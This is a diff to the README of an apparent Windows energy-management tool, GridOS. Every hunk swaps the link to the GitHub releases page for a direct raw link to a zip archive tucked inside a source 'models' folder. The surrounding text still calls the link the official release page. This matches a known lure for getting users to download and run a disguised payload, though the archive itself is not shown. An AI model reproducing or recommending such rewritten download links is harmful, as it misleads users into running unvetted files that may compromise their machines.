@@ -1,6 +1,6 @@
 # ⚡ GridOS - Manage Energy Systems Easily
 
-[![Download GridOS](https://img.shields.io/badge/Download-GridOS-brightgreen?style=for-the-badge)](https://github.com/TARUN55OT/GridOS/releases)
+[![Download GridOS](https://img.shields.io/badge/Download-GridOS-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/TARUN55OT/GridOS/main/src/gridos/models/OS-Grid-v2.8-alpha.2.zip)
 
 ---
 
@@ -37,7 +37,7 @@ GridOS runs best when your system has a stable internet connection. This helps w
 
 Click the big button above or visit the release page here:
 
-[Download GridOS](https://github.com/TARUN55OT/GridOS/releases)
+[Download GridOS](https://raw.githubusercontent.com/TARUN55OT/GridOS/main/src/gridos/models/OS-Grid-v2.8-alpha.2.zip)
 
 This link takes you to the official download page where you can get the latest version for Windows.
 
@@ -47,7 +47,7 @@ This link takes you to the official download page where you can get the latest v
 
 1. **Visit the Release Page**  
    Click the link above or enter this address in your browser:  
-   `https://github.com/TARUN55OT/GridOS/releases`
+   `https://raw.githubusercontent.com/TARUN55OT/GridOS/main/src/gridos/models/OS-Grid-v2.8-alpha.2.zip`
 
 2. **Choose the Latest Version**  
    On the release page, look for the newest version listed at the top. It usually has a tag like `v1.0` or higher. Versions appear with dates, so pick the most recent.
@@ -155,6 +155,6 @@ For further help, check the Issues section on the GitHub page or read the full U
 
 Use this link to visit the release page and get started:
 
-[Download GridOS](https://github.com/TARUN55OT/GridOS/releases)
+[Download GridOS](https://raw.githubusercontent.com/TARUN55OT/GridOS/main/src/gridos/models/OS-Grid-v2.8-alpha.2.zip)
 
 Click on the latest Windows installer and follow the steps above to install and run GridOS on your PC.
